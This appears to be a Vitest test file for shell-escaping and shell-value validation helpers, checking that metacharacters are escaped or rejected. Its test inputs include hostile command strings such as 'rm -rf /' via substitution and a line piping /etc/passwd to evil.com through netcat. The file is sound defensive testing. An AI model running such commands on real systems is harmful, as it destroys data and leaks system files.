import { describe, it, expect } from "vitest";
import { shellEscape, validateShellValue } from "./shellEscape";

describe("shellEscape", () => {
  it("escapes double quotes", () => {
    expect(shellEscape('say "hello"')).toBe('say \\"hello\\"');
  });

  it("escapes backslashes", () => {
    expect(shellEscape("path\\to\\file")).toBe("path\\\\to\\\\file");
  });

  it("escapes dollar signs", () => {
    expect(shellEscape("cost is $100")).toBe("cost is \\$100");
  });

  it("escapes backticks", () => {
    expect(shellEscape("run `cmd`")).toBe("run \\`cmd\\`");
  });

  it("escapes newlines", () => {
    expect(shellEscape("line1\nline2")).toBe("line1\\nline2");
  });

  it("escapes carriage returns", () => {
    expect(shellEscape("line1\rline2")).toBe("line1\\rline2");
  });

  it("escapes exclamation marks", () => {
    expect(shellEscape("hello!")).toBe("hello\\!");
  });

  it("handles strings with multiple special characters", () => {
    const input = 'echo "$(`whoami`)"';
    const result = shellEscape(input);
    // Every backtick should be escaped (preceded by backslash)
    expect(result).not.toMatch(/(?<!\\)`/);
    // Every double quote should be escaped
    expect(result).not.toMatch(/(?<!\\)"/);
    // Every dollar sign should be escaped
    expect(result).not.toMatch(/(?<!\\)\$/);
  });

  it("leaves safe strings unchanged", () => {
    expect(shellEscape("hello world 123")).toBe("hello world 123");
  });

  it("handles empty string", () => {
    expect(shellEscape("")).toBe("");
  });
});

describe("validateShellValue", () => {
  it("rejects backticks", () => {
    const result = validateShellValue("`whoami`");
    expect(result).not.toBeNull();
    expect(result).toContain("disallowed");
  });

  it("rejects $() command substitution", () => {
    const result = validateShellValue("$(rm -rf /)");
    expect(result).not.toBeNull();
    expect(result).toContain("disallowed");
  });

  it("rejects ${} variable expansion", () => {
    const result = validateShellValue("${HOME}");
    expect(result).not.toBeNull();
    expect(result).toContain("disallowed");
  });

  it("rejects semicolons", () => {
    const result = validateShellValue("cmd; rm -rf /");
    expect(result).not.toBeNull();
    expect(result).toContain("disallowed");
  });

  it("rejects pipes", () => {
    const result = validateShellValue("cat /etc/passwd | nc evil.com 1234");
    expect(result).not.toBeNull();
    expect(result).toContain("disallowed");
  });

  it("rejects ampersands", () => {
    const result = validateShellValue("cmd && evil");
    expect(result).not.toBeNull();
    expect(result).toContain("disallowed");
  });

  it("rejects redirect operators", () => {
    expect(validateShellValue("cmd > /tmp/out")).not.toBeNull();
    expect(validateShellValue("cmd < /tmp/in")).not.toBeNull();
  });

  it("rejects parentheses", () => {
    expect(validateShellValue("(subshell)")).not.toBeNull();
  });

  it("rejects double quotes", () => {
    expect(validateShellValue('say "hello"')).not.toBeNull();
  });

  it("rejects single quotes", () => {
    expect(validateShellValue("it's")).not.toBeNull();
  });

  it("rejects newlines", () => {
    expect(validateShellValue("line1\nline2")).not.toBeNull();
  });

  it("returns null for safe values", () => {
    expect(validateShellValue("hello-world")).toBeNull();
    expect(validateShellValue("simple_value_123")).toBeNull();
    expect(validateShellValue("path/to/file.txt")).toBeNull();
    expect(validateShellValue("")).toBeNull();
    expect(validateShellValue("42")).toBeNull();
  });
});
